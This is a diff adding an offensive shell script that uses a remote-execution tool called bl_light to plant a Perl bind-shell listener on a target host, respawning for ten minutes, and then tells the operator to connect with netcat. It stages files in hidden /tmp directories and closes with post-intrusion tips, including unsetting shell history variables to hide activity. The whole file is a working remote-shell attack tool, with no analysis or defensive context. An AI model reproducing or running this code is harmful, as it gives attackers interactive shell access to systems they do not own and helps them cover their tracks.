@@ -1,0 +1,142 @@
+#!/bin/sh
+VER=1.0.0.1
+##########################################################
+### Generate & run the following scripts:
+###     - script to upload grinch on target (gr_upload.scr)
+###     - script to upload gr_upload.scr (initial_upload.scr)
+###     - run grins/frowns/whatever using the above scripts
+##########################################################
+
+# Some default values
+SCRIPT="/tmp/.t"
+DIR="/tmp/.X11R6"
+CALLBACK_PORT=32177
+PROGNAME=`basename $0`
+# Listener respawns for ten minutes
+BURNAT=600
+
+usage() {
+    echo $PROGNAME v.$VER
+    [ "$1" = "v" ] && exit 1
+    cat <<EOF
+
+$PROGNAME uses bl_light to start a listener on the remote target. A long
+perl command is sent up that allows interactivity to the remote system
+via that listener. When one session to the listener dies, a fresh
+listener will be started. This behavior continues for $BURNAT seconds,
+when the perl exits completely (though an established session will stay
+live until you exit or kill it).
+
+Once the listener is on the target, connect to it via netcat and you will
+in an interactive shell (though without a prompt).
+
+Usage: ${0} [options]
+  -i <target ip>          (required)
+  -l <callback ip>        (required)
+  -P /path                (path perl lives in, defaults to searching \$PATH)
+EOF
+    [ "$*" ] && echo -e "\a\n\nERROR: $*\n"
+    exit 1
+}
+
+# There must be at least one argument
+if [ ${#} -eq 0 ]; then
+    usage
+fi
+
+#
+# Process args
+#
+    while getopts i:p:hvl:P: op; do
+        case $op in
+	h|v) usage $op;;
+        i)  TARGET_IP="$OPTARG";;
+	l)  CALLBACK_IP="$OPTARG";;
+	p)  TARGET_PORT="$OPTARG";;
+	P)  PERLPATH="$OPTARG/";;
+        esac
+    done
+    cmdFlag="-c"
+    shift `expr $OPTIND - 1`
+
+# Check for required args
+    [ -z "$TARGET_IP" ] && echo "Error: missing remote IP -i argument" && usage
+    [ -z "$TARGET_PORT" ] && echo "Error: missing remote port -p argument" && usage
+
+if [ ! "${PERLPATH:0:1}" = "/" ] ; then
+    usage "-P argument \"$PERLPATH\" must start with /"
+fi
+PERLPATH=`echo "$PERLPATH" | sed "s,//,/,g"`
+PERLLEN=`echo -n $PERLPATH | wc -c`
+PERLLEN=$((PERLLEN-4))
+PERLTEST=${PERLPATH:$PERLLEN}
+
+if [ "$PERLTEST" = "perl" ] ; then
+    echo -e "Your path (-P) argument ends in \"perl\", so we will be running:\n\n"
+    echo -e "    $PERLPATH/perl\n\n"
+    echo -en "^C to abort now if that is wrong, or hit return to continue. "
+    read blah
+fi
+
+if [ "${TARGET_IP:0:3}" = "127" ] ; then
+    echo -e "For your NOPEN tunnel window:\n\nl $TARGET_PORT TARGET_IP\n"
+fi
+
+
+# This exec one is silly...that would start a second
+# listener AFTER we connect
+#RUN_WHAT="fork or exec \"/bin/sh\""
+RUN_WHAT="system \"/bin/sh\""
+
+#CMD="/sbin/sh -c (perl -MIO -e 'if (\$k=fork){\$i=$BURNAT;while(\$i--){sleep 1};kill(9,\$k);exit}chdir(\"/tmp\");while(\$c=new IO::Socket::INET(LocalPort,$TARGET_PORT,Reuse,1,Listen)->accept){\$~->fdopen(\$c,w);STDIN->fdopen(\$c,r);STDERR->fdopen(\$c,w);$RUN_WHAT}')&"
+CMD="/bin/sh -c \\\"${PERLPATH}perl -MIO -e 'use IO::Socket::INET;if (\\\$k=fork){\\\$i=$BURNAT;while(\\\$i--){sleep 1};kill(9,\\\$k);exit}chdir(\"/tmp\");while(\\\$c=new IO::Socket::INET(LocalPort,$TARGET_PORT,Reuse,1,Listen)->accept){\\\$~->fdopen(\\\$c,w);STDIN->fdopen(\\\$c,r);STDERR->fdopen(\\\$c,w);$RUN_WHAT}'\\\""
+CMD="${PERLPATH}perl -MIO -e 'use IO::Socket::INET;if (\\\$k=fork){\\\$i=$BURNAT;while(\\\$i--){sleep 1};kill(9,\\\$k);exit}chdir(\"/tmp\");while(\\\$c=new IO::Socket::INET(LocalPort,$TARGET_PORT,Reuse,1,Listen)->accept){\\\$~->fdopen(\\\$c,w);STDIN->fdopen(\\\$c,r);STDERR->fdopen(\\\$c,w);$RUN_WHAT}'&"
+
+
+#CMD=`echo "$CMD" | sed "s/\$/\\\$/g"`
+#CMD=`echo "$CMD" | sed "s/\$/\\\$/g"`
+    
+echo -e "perl listener command will be: +$CMD+"
+
+#usage "FATAL: Could not get this perlbind version to work right yet.\n       Try either bll.telnet.gr or bll.perlcallback.gr."
+
+cat <<EOF
+
+About to run this (but do NOT try pasting this...something wrong escapes-wise....):
+
+bl_light ${TARGET_IP} "$CMD"
+
+You can abort here with ^C, hit return to continue.
+
+EOF
+
+read blah
+
+echo "now running:  "
+
+./bl_light ${TARGET_IP} "$CMD"
+
+
+echo -e "\n\nYou may want this now:\n\nnc $TARGET_IP $TARGET_PORT\n\n"
+
+
+echo "Thank you for playing"
+
+
+cat <<EOF
+
+These might come in handy:
+
+unset HISTFILE
+unset HISTFILESIZE
+unset HISTSIZE
+w
+id
+uname -a
+ls -la /boot
+mkdir /tmp/.scsi;cd /tmp/.scsi;pwd
+which uudecode uncompress
+        # gedit sendmail
+uudecode; ls -la
+
+EOF
